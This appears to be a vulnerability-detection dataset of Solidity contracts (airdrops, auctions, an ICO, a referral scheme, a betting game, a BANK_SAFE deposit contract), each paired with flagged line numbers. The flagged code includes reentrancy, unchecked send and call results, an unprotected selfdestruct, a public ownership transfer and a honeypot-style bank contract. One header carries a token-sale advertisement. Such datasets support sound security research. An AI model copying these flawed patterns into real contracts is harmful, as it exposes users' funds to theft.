    function batchTransferToken(address _contractAddress, address[] _addresses, uint _value) public {
        // data validate & _addresses length limit
        require(_addresses.length > 0);
        StandardToken token = StandardToken(_contractAddress);
        // transfer circularly
        for (uint i = 0; i < _addresses.length; i++) {
            token.transferFrom(msg.sender, _addresses[i], _value);
        }
    }
    /**
     * batch transfer for ERC20 token.
     *
     * @param _contractAddress ERC20 token address
     * @param _addresses array of address to sent
     * @param _value array of transfer amount
     */
    function batchTransferTokenS(address _contractAddress, address[] _addresses, uint[] _value) public {
        // data validate & _addresses length limit
        require(_addresses.length > 0);
        require(_addresses.length == _value.length);
        StandardToken token = StandardToken(_contractAddress);
        // transfer circularly
        for (uint i = 0; i < _addresses.length; i++) {
            token.transferFrom(msg.sender, _addresses[i], _value[i]);
        }
    }
    /**
     * batch transfer for ETH.(the same amount)
     *
     * @param _addresses array of address to sent
     */
    function batchTransferETH(address[] _addresses) payable public {
        // data validate & _addresses length limit
        require(_addresses.length > 0);
        // transfer circularly
        for (uint i = 0; i < _addresses.length; i++) {
            _addresses[i].transfer(msg.value.div(_addresses.length));
        }
    }
    /**
     * batch transfer for ETH.
     *
     * @param _addresses array of address to sent
     * @param _value array of transfer amount
     */
    function batchTransferETHS(address[] _addresses, uint[] _value) payable public {
        // data validate & _addresses length limit
        require(_addresses.length > 0);
        require(_addresses.length == _value.length);
        // transfer circularly
        for (uint i = 0; i < _addresses.length; i++) {
            _addresses[i].transfer(_value[i]);
        }
    }
}","[100, 115]"
"//  █████████   ▄████      ███  ███▄      ███      ▄████               ▄████      ███
//  ███▀▀▀▀▀   ▄██████     ███  █████   ▄████▌    ▄██████             ▄██████     ███
//  ████████  ▄███ ▀███    ███  ██████ ██████▌   ▄███  ███           ▄███  ███    ███
//  ███▀▀▀▀▀  ██████████   ███  ███▌█████ ███▌   ██████████         ▄██████████   ███
//  ███      ███▀    ████  ███  ███  ▀█▀  ███▌  ███▀    ████  ██   ▄███▀    ████  ███
//
//
// Congratulations! Its your free airdrop token.
// Get ready to participate in token sale www.faima.ai 
// Pre-ICO starts on 1.03.2018
// Private SALE IS OPEN now
// 1BTC=20000$+bonus
// 1ETH=2000$+bonus
// for booking: ceo@faima.ai
pragma solidity 0.4.18;
contract Ownable {
    address public owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() { require(msg.sender == owner); _; }
    function Ownable() public {
        owner = msg.sender;
    }
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        owner = newOwner;
        OwnershipTransferred(owner, newOwner);
    }
}
contract Withdrawable is Ownable {
    function withdrawEther(address _to, uint _value) onlyOwner public returns(bool) {
        require(_to != address(0));
        require(this.balance >= _value);
        _to.transfer(_value);
        return true;
    }
    function withdrawTokens(ERC20 _token, address _to, uint _value) onlyOwner public returns(bool) {
        require(_to != address(0));
        return _token.transfer(_to, _value);
    }
}
contract ERC20 {
    uint256 public totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function balanceOf(address who) public view returns(uint256);
    function transfer(address to, uint256 value) public returns(bool);
    function transferFrom(address from, address to, uint256 value) public returns(bool);
    function allowance(address owner, address spender) public view returns(uint256);
    function approve(address spender, uint256 value) public returns(bool);
}
contract AirDrop is Withdrawable {
    event TransferEther(address indexed to, uint256 value);
    function tokenBalanceOf(ERC20 _token) public view returns(uint256) {
        return _token.balanceOf(this);
    }
    function tokenAllowance(ERC20 _token, address spender) public view returns(uint256) {
        return _token.allowance(this, spender);
    }
    function tokenTransfer(ERC20 _token, uint _value, address[] _to) onlyOwner public {
        require(_token != address(0));
        for(uint i = 0; i < _to.length; i++) {
            require(_token.transfer(_to[i], _value));
        }
    }
    function tokenTransferFrom(ERC20 _token, address spender, uint _value, address[] _to) onlyOwner public {
        require(_token != address(0));
        for(uint i = 0; i < _to.length; i++) {
            require(_token.transferFrom(spender, _to[i], _value));
        }
    }
    function etherTransfer(uint _value, address[] _to) onlyOwner payable public {
        for(uint i = 0; i < _to.length; i++) {
            _to[i].transfer(_value);
            TransferEther(_to[i], _value);
        }
    }
}",[73]
"pragma solidity ^0.4.18;
contract AirDropContract{
    function AirDropContract() public {
    }
    modifier validAddress( address addr ) {
        require(addr != address(0x0));
        require(addr != address(this));
        _;
    }
    function transfer(address contract_address,address[] tos,uint[] vs)
        public 
        validAddress(contract_address)
        returns (bool){
        require(tos.length > 0);
        require(vs.length > 0);
        require(tos.length == vs.length);
        bytes4 id = bytes4(keccak256(""transferFrom(address,address,uint256)""));
        for(uint i = 0 ; i < tos.length; i++){
            contract_address.call(id, msg.sender, tos[i], vs[i]);
        }
        return true;
    }
}",[19]
"pragma solidity ^0.4.11;
contract token { function preallocate(address receiver, uint fullTokens, uint weiPrice) public;
                function transferOwnership(address _newOwner) public;
                function acceptOwnership() public;
                }
contract Airdrop {
    token public tokenReward;
    function Airdrop(token _addressOfTokenUsedAsTransfer) public{
         tokenReward = token(_addressOfTokenUsedAsTransfer);
    }
   /* TransferToken function for send token to many accound
        @param _to address array hold the receiver address
        @param _value send token value 
        @param weiPrice Price of a single full token in wei
   */
    function TransferToken (address[] _to, uint _value, uint _weiPrice) public
    {   for (uint i=0; i< _to.length; i++)
        {
        tokenReward.preallocate(_to[i], _value, _weiPrice);
        }
    }
    /* TransferOwner function for Transfer the owner ship to address
        @param _owner address of owner
    */
    function TransferOwner (address _owner) public {
        tokenReward.transferOwnership(_owner);
    }
    /* 
        acceptOwner function for accept owner ship of account
    */
    function acceptOwner () public {
        tokenReward.acceptOwnership();
    }
    /* 
        removeContract function for destroy the contract on network
    */
    function removeContract() public
        {
            selfdestruct(msg.sender);
        }   
}","[37, 39]"
"pragma solidity ^0.4.24;
contract Ownable {
    address public owner;
    mapping (address => bool) private distributors;
    constructor () internal {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyOwnerOrDistributor() {
        require(distributors[msg.sender] == true || msg.sender == owner);
        _;
    }
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0));
        owner = newOwner;
    }
    function setDistributor(address _distributor, bool _allowed) external onlyOwner {
        distributors[_distributor] = _allowed;
    }
}
contract Airdrop is Ownable {
    function () payable public {}
    function airdrop(address[] _to, uint256[] _values) external onlyOwnerOrDistributor {
        require(_to.length == _values.length);
        for (uint256 i = 0; i < _to.length; i++) {
            _to[i].transfer(_values[i]);
        }
    }
}","[28, 29]"
"pragma solidity 0.4.24;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract AirdropEther {
    event Multisended(uint256 value , address sender);
    using SafeMath for uint256;
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }
}",[52]
"pragma solidity ^0.4.23;
contract BEP20 {
    function totalSupply() public view returns (uint256);
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
}
contract AlbertToolsV1 {
    function batchTransferETH(uint256 eachAmount, address[] tos) payable public returns (bool){
        uint256 addressCount = tos.length;
        require(msg.value == eachAmount * addressCount, ""amount not match"");
        for (uint256 i = 0; i < addressCount; i++) {
            address(tos[i]).transfer(eachAmount);
        }
        return true;
    }
    //需要先approve给合约权限
    function batchTransferERC20(address bep20Contract, uint256 eachAmount, address[] tos) public returns (bool){
        BEP20 bep20 = BEP20(bep20Contract);
        uint256 addressCount = tos.length;
        for (uint256 i = 0; i < addressCount; i++) {
            bep20.transferFrom(msg.sender, tos[i], eachAmount);
        }
        return true;
    }
}","[15, 24]"
"pragma solidity ^0.4.25;
contract ArceonMoneyNetwork {
    using SafeMath for uint256;
    address public owner;
    address parentUser;
    address[] users;
    mapping(address => bool) usersExist;
    mapping(address => address) users2users;
    mapping(address => uint256) balances;
    mapping(address => uint256) balancesTotal;
    uint256 nextUserId = 0;
    uint256 cyles = 5;
  constructor() public {owner = msg.sender; }
   modifier onlyOwner {if (msg.sender == owner) _;}
    event Register(address indexed user, address indexed parentUser);
    event BalanceUp(address indexed user, uint256 amount);
    event ReferalBonus(address indexed user, uint256 amount);
    event TransferMyMoney(address user, uint256 amount);
    function bytesToAddress(bytes bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
    function () payable public{
	    parentUser = bytesToAddress(msg.data);
	    if (msg.value==0){ transferMyMoney(); return;}
        require(msg.value == 50 finney);
        require(msg.sender != address(0));
        require(parentUser != address(0));
        require(!usersExist[msg.sender]);
        _register(msg.sender, msg.value);
    }
    function _register(address user, uint256 amount) internal {
        if (users.length > 0) {
            require(parentUser!=user);
            require(usersExist[parentUser]); 
        }
       if (users.length ==0) {users2users[parentUser]=parentUser;} 
        users.push(user);
        usersExist[user]=true;
        users2users[user]=parentUser;
        emit Register(user, parentUser);
        uint256 referalBonus = amount.div(2);
        if (cyles==0) {referalBonus = amount;} //we exclude a money wave
        balances[parentUser] = balances[parentUser].add(referalBonus.div(2));
        balancesTotal[parentUser] = balancesTotal[parentUser].add(referalBonus.div(2));
        emit ReferalBonus(parentUser, referalBonus.div(2));
        balances[users2users[parentUser]] = balances[users2users[parentUser]].add(referalBonus.div(2));
        balancesTotal[users2users[parentUser]] = balancesTotal[users2users[parentUser]].add(referalBonus.div(2));
        emit ReferalBonus(users2users[parentUser], referalBonus.div(2));
        uint256 length = users.length;
        uint256 existLastIndex = length.sub(1);
        //we exclude a money wave
        if (cyles!=0){ 
        for (uint i = 1; i <= cyles; i++) {
            nextUserId = nextUserId.add(1);
            if(nextUserId > existLastIndex){ nextUserId = 0;}
            balances[users[nextUserId]] = balances[users[nextUserId]].add(referalBonus.div(cyles));
            balancesTotal[users[nextUserId]] = balancesTotal[users[nextUserId]].add(referalBonus.div(cyles));
            emit BalanceUp(users[nextUserId], referalBonus.div(cyles));
        }
        }  //we exclude a money wave
    }
    function transferMyMoney() public {
        require(balances[msg.sender]>0);
        msg.sender.transfer(balances[msg.sender]);
        emit TransferMyMoney(msg.sender, balances[msg.sender]);
		balances[msg.sender]=0;
    }
      function ViewRealBalance(address input) public view returns (uint256 balanceReal) {  
       balanceReal= balances[input];
       balanceReal=balanceReal.div(1000000000000);
          return balanceReal;
    }
    function ViewTotalBalance(address input)   public view returns (uint256 balanceTotal) {
      balanceTotal=balancesTotal [input];
      balanceTotal=balanceTotal.div(1000000000000);
          return balanceTotal;
   }
   function viewBlockchainArceonMoneyNetwork(uint256 id) public view  returns (address userAddress) {
        return users[id];
    } 
    function  CirclePoints() public view returns (uint256 CirclePoint) {
        CirclePoint = nextUserId;
        return  CirclePoint;
    }
    function  NumberUser() public view returns (uint256 numberOfUser) {
        numberOfUser = users.length;
        return numberOfUser;
    } 
    function  LenCyless() public view returns (uint256 LenCyles) {
        LenCyles = cyles;
        return LenCyles;
    } 
    function newCyles(uint256 _newCyles) external onlyOwner {
       cyles = _newCyles;
    }
}    
   library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        require(c >= a);
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require(b <= a);
        c = a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require(b > 0);
        c = a / b;
    }
}",[66]
"pragma solidity >=0.5.1 <0.7.0;
contract KOwnerable {
    address[] public _KContractOwners = [
                address(0x7630A0f21Ac2FDe268eF62eBb1B06876DFe71909)
    ];
    constructor() public {
        _KContractOwners.push(msg.sender);
    }
    modifier KOwnerOnly() {
        bool exist = false;
        for ( uint i = 0; i < _KContractOwners.length; i++ ) {
            if ( _KContractOwners[i] == msg.sender ) {
                exist = true;
                break;
            }
        }
        require(exist); _;
    }
    modifier KDAODefense() {
        uint256 size;
        address payable safeAddr = msg.sender;
        assembly {size := extcodesize(safeAddr)}
        require( size == 0, ""DAO_Warning"" );
        _;
    }
}
contract KState is KOwnerable {
    uint public _CIDXX;
    Hosts public _KHost;
    constructor(uint cidxx) public {
        _CIDXX = cidxx;
    }
}
contract KContract is KState {
    modifier readonly {_;}
    modifier readwrite {_;}
    function implementcall() internal {
        (bool s, bytes memory r) = _KHost.getImplement(_CIDXX).delegatecall(msg.data);
        require(s);
        assembly {
            return( add(r, 0x20), returndatasize )
        }
    }
    function implementcall(uint subimplID) internal {
        (bool s, bytes memory r) = _KHost.getImplementSub(_CIDXX, subimplID).delegatecall(msg.data);
        require(s);
        assembly {
            return( add(r, 0x20), returndatasize )
        }
    }
        function _D(bytes calldata, uint m) external KOwnerOnly returns (bytes memory) {
        implementcall(m);
    }
}
pragma solidity >=0.5.0 <0.6.0;
interface USDTInterface {
    function totalSupply() external view returns (uint);
    function balanceOf(address who) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
        function transfer(address to, uint value) external;
    function approve(address spender, uint value) external;
    function transferFrom(address from, address to, uint value) external;
}
pragma solidity >=0.5.1 <0.7.0;
interface AssertPoolInterface{
    enum AssertPoolName {
        Nullable,
                Prepare,
                Treasure,
                Awards,
                Events
    }
        function PoolNameFromOperator(address operator) external returns (AssertPoolName);
        function Allowance(address operator) external returns (uint);
        function OperatorSend(address to, uint amount) external;
        function Auth_RecipientDelegate(uint amount) external;
}
pragma solidity >=0.5.1 <0.7.0;
contract AssertPoolState is AssertPoolInterface, KState(0xbdfa5467) {
        uint[5] public matchings = [
        0,
        0.2 szabo,
        0.2 szabo,
        0.4 szabo,
        0.2 szabo
    ];
        uint[5] public availTotalAmouns = [
        0,
        0,
        0,
        0,
        0
    ];
        address[5] public operators = [
        address(0x0),
        address(0x0),
        address(0x0),
        address(0x0),
        address(0x0)
    ];
    USDTInterface internal usdtInterface;
    address internal authAddress;
}
contract Hosts {
    address public owner;
    mapping(uint => mapping(uint => address)) internal impls;
    mapping(uint => uint) internal time;
    constructor() public {
        owner = msg.sender;",[45]
"pragma solidity ^0.4.23;
// Deploying version: https://github.com/astralship/auction-ethereum/commit/1359e14e0319c6019eb9c7e57348b95c722e3dd6
// Timestamp Converter: 1529279999
// Is equivalent to: 06/17/2018 @ 11:59pm (UTC)
// Sunday midnight, in a week 😎
contract Auction {
  string public description;
  string public instructions; // will be used for delivery address or email
  uint public price;
  bool public initialPrice = true; // at first asking price is OK, then +25% required
  uint public timestampEnd;
  address public beneficiary;
  bool public finalized = false;
  address public owner;
  address public winner;
  mapping(address => uint) public bids;
  address[] public accountsList; // so we can iterate: https://ethereum.stackexchange.com/questions/13167/are-there-well-solved-and-simple-storage-patterns-for-solidity
  // THINK: should be (an optional) constructor parameter?
  // For now if you want to change - simply modify the code
  uint public increaseTimeIfBidBeforeEnd = 24 * 60 * 60; // Naming things: https://www.instagram.com/p/BSa_O5zjh8X/
  uint public increaseTimeBy = 24 * 60 * 60;
  event Bid(address indexed winner, uint indexed price, uint indexed timestamp);
  event Refund(address indexed sender, uint indexed amount, uint indexed timestamp);
  modifier onlyOwner { require(owner == msg.sender, ""only owner""); _; }
  modifier onlyWinner { require(winner == msg.sender, ""only winner""); _; }
  modifier ended { require(now > timestampEnd, ""not ended yet""); _; }
  function setDescription(string _description) public onlyOwner() {
    description = _description;
  }
  function setInstructions(string _instructions) public ended() onlyWinner()  {
    instructions = _instructions;
  }
  constructor(uint _price, string _description, uint _timestampEnd, address _beneficiary) public {
    require(_timestampEnd > now, ""end of the auction must be in the future"");
    owner = msg.sender;
    price = _price;
    description = _description;
    timestampEnd = _timestampEnd;
    beneficiary = _beneficiary;
  }
  function() public payable {
    if (msg.value == 0) { // when sending `0` it acts as if it was `withdraw`
      refund();
      return;
    }
    require(now < timestampEnd, ""auction has ended""); // sending ether only allowed before the end
    if (bids[msg.sender] > 0) { // First we add the bid to an existing bid
      bids[msg.sender] += msg.value;
    } else {
      bids[msg.sender] = msg.value;
      accountsList.push(msg.sender); // this is out first bid, therefore adding 
    }
    if (initialPrice) {
      require(bids[msg.sender] >= price, ""bid too low, minimum is the initial price"");
    } else {
      require(bids[msg.sender] >= (price * 5 / 4), ""bid too low, minimum 25% increment"");
    }
    if (now > timestampEnd - increaseTimeIfBidBeforeEnd) {
      timestampEnd = now + increaseTimeBy;
    }
    initialPrice = false;
    price = bids[msg.sender];
    winner = msg.sender;
    emit Bid(winner, price, now);
  }
  function finalize() public ended() onlyOwner() {
    require(finalized == false, ""can withdraw only once"");
    require(initialPrice == false, ""can withdraw only if there were bids"");
    finalized = true; // THINK: DAO hack reentrancy - does it matter which order? (just in case setting it first)
    beneficiary.send(price);
    bids[winner] = 0; // setting it to zero that in the refund loop it is skipped
    for (uint i = 0; i < accountsList.length;  i++) {
      if (bids[accountsList[i]] > 0) {
        accountsList[i].send( bids[accountsList[i]] ); // send? transfer? tell me baby: https://ethereum.stackexchange.com/a/38642/2524
        bids[accountsList[i]] = 0; // in case someone calls `refund` again
      }
    }     
  }
  function refund() public {
    require(msg.sender != winner, ""winner cannot refund"");
    msg.sender.send( bids[msg.sender] );
    emit Refund(msg.sender, bids[msg.sender], now);
    bids[msg.sender] = 0;
  }
}","[58, 81]"
"    ) public {
        auctionTitle = _auctionTitle;
        beneficiary = _beneficiary;
        auctionEnd = _auctionEnd;
        auctionDescription = _auctionDesc;
        auctionState = AuctionStates.Started;
        minimumBid = _minimumBid;
        if (_escrowEnabled) {
          // TODO: get moderatorID, (delegate moderator list to a ens resolver)
          escrowModerator = address(0x32cEfb2dC869BBfe636f7547CDa43f561Bf88d5A); //TODO: ENS resolver for auctionify.eth
        }
        if (_listed) {
          // TODO: List in the registrar
        }
    }
    /// @author Auctionify.xyz
   /// @notice Bid on the auction with the amount of `msg.value`
   /// The lesser value will be refunded.
   /// updates highestBidder
   /// @dev should satisfy auctionNotEnded(), isMinimumBid(), isHighestBid()
    function bid() public payable auctionNotEnded isMinimumBid isHighestBid {
        // No arguments are necessary, all
        // information is already part of
        // the transaction.
        if (highestBidder != address(0)) {
            //refund the last highest bid
            uint lastBid = bids[highestBidder];
            bids[highestBidder] = 0;
            if(!highestBidder.send(lastBid)) {
                // if failed to send, the bid is kept in the contract
                emit CheaterBidder(highestBidder, lastBid);
            }
        }
        //set the new highestBidder
        highestBidder = msg.sender;
        bids[msg.sender] = msg.value;
        //change state and trigger event
        auctionState = AuctionStates.Ongoing;
        emit HighestBidIncreased(msg.sender, msg.value);
    }
    /// @author auctionify.xyz
   /// @notice Getter function for highestBid `bids[highestBidder]`
   /// @dev View only function, free
   /// @return the highest bid value
    function highestBid() public view returns(uint){
      return (bids[highestBidder]);
    }
    /// End the auction and send the highest bid
    /// to the beneficiary.
    /// @author auctionify.xyz
   /// @notice Ends the auction and sends the `bids[highestBidder]` to `beneficiary`
   /// @dev onlyHighestBidderOrEscrow, after `auctionEnd`, only if `auctionState != AuctionStates.Ended`
    function endAuction() public onlyHighestBidderOrEscrow {
        // 1. Conditions
        require(now >= auctionEnd, ""Auction not yet ended."");
        require(auctionState != AuctionStates.Ended, ""Auction has already ended."");
        // 2. Effects
        auctionState = AuctionStates.Ended;
        emit AuctionEnded(highestBidder, bids[highestBidder]);
        // 3. Interaction. send the money to the beneficiary
        if(!beneficiary.send(bids[highestBidder])) {
            // if failed to send, the final bid is kept in the contract
            // the funds can be released using cleanUpAfterYourself()
        }
    }
    /// @author auctionify.xyz
   /// @notice selfdestructs and sends the balance to `escrowModerator` or `beneficiary`
   /// @dev only if `auctionState == AuctionStates.Ended`
  function cleanUpAfterYourself() public {
    require(auctionState == AuctionStates.Ended, ""Auction is not ended."");
      if (escrowModerator != address(0)) {
        selfdestruct(escrowModerator);
      } else {
        selfdestruct(beneficiary); //save blockchain space, save lives
      }
  }
}","[55, 69, 72, 74]"
"pragma solidity ^0.4.19;
contract BANK_SAFE
{
    mapping (address=>uint256) public balances;   
    uint public MinSum;
    LogFile Log;
    bool intitalized;
    function SetMinSum(uint _val)
    public
    {
        if(intitalized)throw;
        MinSum = _val;
    }
    function SetLogFile(address _log)
    public
    {
        if(intitalized)throw;
        Log = LogFile(_log);
    }
    function Initialized()
    public
    {
        intitalized = true;
    }
    function Deposit()
    public
    payable
    {
        balances[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)
        {
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                Log.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Deposit();
    }
}
contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[38, 40]"
"    uint256 public totalMigrated;
    // Exchange address
    address public exchangeAddress;
    // Team accounts
    address private constant mainAccount = 0xEB1D40f6DA0E77E2cA046325F6F2a76081B4c7f4;
    address private constant coreTeamMemberOne = 0xe43088E823eA7422D77E32a195267aE9779A8B07;
    address private constant coreTeamMemberTwo = 0xad00884d1E7D0354d16fa8Ab083208c2cC3Ed515;
    // Ether raised
    uint256 private raised = 0;
    // Since we have different exchange rates, we need to keep track of how
    // much ether each contributed in case that we need to issue a refund
    mapping (address => uint256) private ethBalances;
    uint256 private constant divisor = 10000;
    // Events
    event LogRefund(address indexed _from, uint256 _value);
    event LogMigrate(address indexed _from, address indexed _to, uint256 _value);
    event LogBuy(address indexed _purchaser, address indexed _beneficiary, uint256 _value, uint256 _amount);
    // Check if min cap was archived.
    modifier onlyWhenICOReachedCreationMinCap() {
        require( totalSupply >= creationMinCap );
        _;
    }
    function() payable {
        buy(msg.sender);
    }
    function creationRateOnTime() public constant returns (uint256) {
        uint256 currentPrice;
        if (now > endTime) {
            currentPrice = endCreationRateOnTime;
        }
        else {
            //Price is changing lineral starting from  startCreationRateOnTime to endCreationRateOnTime
            uint256 rateRange = startCreationRateOnTime - endCreationRateOnTime;
            uint256 timeRange = endTime - startTime;
            currentPrice = startCreationRateOnTime.sub(rateRange.mul(now.sub(startTime)).div(timeRange));
        }
        return currentPrice;
    }
    //Calculate number of BBD tokens for provided ether
    function calculateBDD(uint256 _ethVal) private constant returns (uint256) {
        uint256 bonus;
        //We provide bonus depending on eth value
        if (_ethVal < quantityThreshold_10) {
            bonus = 0; // 0% bonus
        }
        else if (_ethVal < quantityThreshold_30) {
            bonus = quantityBonus_10; // 5% bonus
        }
        else if (_ethVal < quantityThreshold_100) {
            bonus = quantityBonus_30; // 10% bonus
        }
        else if (_ethVal < quantityThreshold_300) {
            bonus = quantityBonus_100; // 15% bonus
        }
        else {
            bonus = quantityBonus_300; // 20% bonus
        }
        // Get number of BBD tokens
        return _ethVal.mul(creationRateOnTime()).mul(divisor.add(bonus)).div(divisor);
    }
    // Buy BBD
    function buy(address _beneficiary) payable {
        require(!finalized);
        require(msg.value != 0);
        require(now <= endTime);
        require(now >= startTime);
        uint256 bbdTokens = calculateBDD(msg.value);
        uint256 additionalBBDTokensForMainAccount = bbdTokens.mul(2250).div(divisor); // 22.5%
        uint256 additionalBBDTokensForCoreTeamMember = bbdTokens.mul(125).div(divisor); // 1.25%
        //Increase by 25% number of bbd tokens on each buy.
        uint256 checkedSupply = totalSupply.add(bbdTokens)
                                           .add(additionalBBDTokensForMainAccount)
                                           .add(2 * additionalBBDTokensForCoreTeamMember);
        require(creationMaxCap >= checkedSupply);
        totalSupply = checkedSupply;
        //Update balances
        balances[_beneficiary] = balances[_beneficiary].add(bbdTokens);
        balances[mainAccount] = balances[mainAccount].add(additionalBBDTokensForMainAccount);
        balances[coreTeamMemberOne] = balances[coreTeamMemberOne].add(additionalBBDTokensForCoreTeamMember);
        balances[coreTeamMemberTwo] = balances[coreTeamMemberTwo].add(additionalBBDTokensForCoreTeamMember);
        ethBalances[_beneficiary] = ethBalances[_beneficiary].add(msg.value);
        raised += msg.value;
        if (exchangeAddress != 0x0 && totalSupply >= creationMinCap && msg.value >= 1 ether) {
            // After archiving min cap we start moving 10% to exchange. It will help with liquidity on exchange.
            exchangeAddress.transfer(msg.value.mul(1000).div(divisor)); // 10%
        }
        LogBuy(msg.sender, _beneficiary, msg.value, bbdTokens);
    }
    // Finalize for successful ICO
    function finalize() onlyOwner external {
        require(!finalized);
        require(now >= endTime || totalSupply >= creationMaxCap);
        finalized = true;
        uint256 ethForCoreMember = raised.mul(500).div(divisor);
        coreTeamMemberOne.transfer(ethForCoreMember); // 5%
        coreTeamMemberTwo.transfer(ethForCoreMember); // 5%
        mainAccount.transfer(this.balance); //90%
    }
    // Refund if ICO won't reach min cap
    function refund() external {
        require(now > endTime);
        require(totalSupply < creationMinCap);
        uint256 bddVal = balances[msg.sender];
        require(bddVal > 0);
        uint256 ethVal = ethBalances[msg.sender];
        require(ethVal > 0);
        balances[msg.sender] = 0;
        ethBalances[msg.sender] = 0;
        totalSupply = totalSupply.sub(bddVal);
        msg.sender.transfer(ethVal);
        LogRefund(msg.sender, ethVal);
    }
    // Allow to migrate to next version of contract
    function migrate(uint256 _value) external {
        require(finalized);
        require(migrationAgent != 0x0);
        require(_value > 0);
        require(_value <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalMigrated = totalMigrated.add(_value);
        MigrationAgent(migrationAgent).migrateFrom(msg.sender, _value);
        LogMigrate(msg.sender, migrationAgent, _value);
    }
    // Set migration Agent
    function setMigrationAgent(address _agent) onlyOwner external {
        require(finalized);
        require(migrationAgent == 0x0);","[28, 35, 65, 66, 92, 101]"
"    function getStrFromId(uint toConv) view public returns (string) {
        return StringYokes.zint_bytes32ToString(sides[toConv]);
    }
    function getIdFromStr(string toConv) view public returns (uint) {
        return idToNameRef[StringYokes.zint_convert(toConv)];
    }
    function placeBet(address a, uint value, string betSide) public payable {
        require(isNotExpired());
        bytes32 index = StringYokes.zint_convert(betSide);
        sideData[index].totalPledged+=value;
        allSidesPledged+=value;
        if (sideData[index].contribDb[a].used) {
            value+=sideData[index].contribDb[a].contribAmount;
        }
        else {
            sideData[index].usedAddresses.push(a);
            sideData[index].contribDb[a].used=true;
        }
        sideData[index].contribDb[a].contribAmount+=value;
    }
    function allSidesPledgedAmount() public view returns (uint) {
        return allSidesPledged;
    }
    function checkSidePledge(uint i) public view returns (uint) {
        return sideData[sides[i]].totalPledged;
    }
    function dish(string winner, address profit) public onlyAdmin payable {
        require(!expired);
        expired = true;
        bytes32 winByte = StringYokes.zint_convert(winner);
        uint totalGameContrib = allSidesPledged;
        uint totalSideContrib = (sideData[winByte].totalPledged);
        for (uint i = 0; i<sideData[winByte].usedAddresses.length; i++) {
            address recip = sideData[winByte].usedAddresses[i];
            uint contribAmount = sideData[winByte].contribDb[recip].contribAmount;
            uint winAddition = (925*1000*contribAmount*(totalGameContrib-totalSideContrib))/(1000000*totalSideContrib);
            recip.transfer(contribAmount+winAddition);
        }
        profit.transfer(address(this).balance);
    }
    function refund() public onlyAdmin payable {
        for (uint i = 0; i<sides.length; i++) {
            for (uint j = 0; j<sideData[sides[i]].usedAddresses.length; j++) {
            address recip = sideData[sides[i]].usedAddresses[j];
            uint contribAmount = sideData[sides[i]].contribDb[recip].contribAmount;
            recip.transfer(contribAmount);
            }
        }
    }
}
contract BEthy is ExchangeAdmin {
    Game[] current;
    uint etherBalance;
    mapping (bytes32 => uint) public references;
    constructor () public {
    }
    function addGame(string gameName, uint gameExpiry, bytes32[] gameSides) onlyAdmin public {
        current.push(new Game(gameName, gameExpiry, gameSides));
        references[StringYokes.zint_convert(gameName)]=current.length-1;
    }
    function numGames() view public returns (uint) {
        return current.length;
    }
    function getName(uint i) view public returns (string, bool, uint) {
       return (current[i].getGameName(), current[i].isNotExpired(), current[i].allSidesPledgedAmount());
    }
    function getSidesById(uint i, uint j) view public returns (string, uint) {
        return (StringYokes.zint_bytes32ToString(current[i].getGameSides()[j]), current[i].checkSidePledge(j));
    }
    function getSides(string str, uint j) view public returns (string, uint) {
        return getSidesById(references[StringYokes.zint_convert(str)], j);
    }
    function getGameNumSides(uint i) view public returns (uint) {
        return current[i].getNumSides();
    }
    function _byteToString(bytes32 x) public pure returns (string) {
        return StringYokes.zint_bytes32ToString(x);
    }
    function _stringToByte(string x) public pure returns (bytes32) {
        return StringYokes.zint_convert(x);
    }
